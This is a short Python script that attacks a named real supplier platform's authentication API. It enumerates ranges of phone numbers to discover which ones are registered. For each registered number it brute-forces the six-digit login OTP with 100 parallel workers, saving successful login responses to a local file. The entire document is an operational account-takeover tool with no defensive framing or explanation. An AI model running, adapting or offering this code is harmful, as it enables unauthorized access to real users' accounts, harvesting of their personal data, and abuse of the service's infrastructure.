import requests
import json
from joblib import Parallel,delayed

url = 'https://supplierapi.moglix.com/auth/sendOtp?phone='
otpurl = 'https://supplierapi.moglix.com/auth/otpLogin'
def otpbrute(num, pnum):
    global otpurl
    # print(num, pnum)
    try:
        obj = '{"username":"'+ str(pnum) +'", "password": "", "otp":"' + str(num) +'", "source":0}'
        obj = json.loads(obj)
        outp = requests.post(otpurl, json=obj)
        checkoutp = json.loads(outp.text)
        if checkoutp["success"]:
            with open('otpsuccess', "a") as otpfile:
                otpfile.write(str(pnum) + "\n" + str(outp.text) + "\n\n\n\n")
    except:
        print("Some error occured")
    

def funcaller(pnum):
    global url
    try:
        req = requests.get(url + str(pnum))
        outp = json.loads(req.text)
        
        if "OTP" in outp['message']:
            with open('registered_nums', "a") as phfile:
                phfile.write(str(pnum) + "\n")
            Parallel(n_jobs=100, verbose=10)(delayed(otpbrute) (str(t).zfill(6), pnum) for t in range(100000))    
    except:
        print("some error")
        print("some error occured")

Parallel(n_jobs=100)(delayed(funcaller)(i) for i in range(9811103137, 9811109999))
Parallel(n_jobs=15)(delayed(funcaller)(i) for i in range(8800000000, 8899999999))

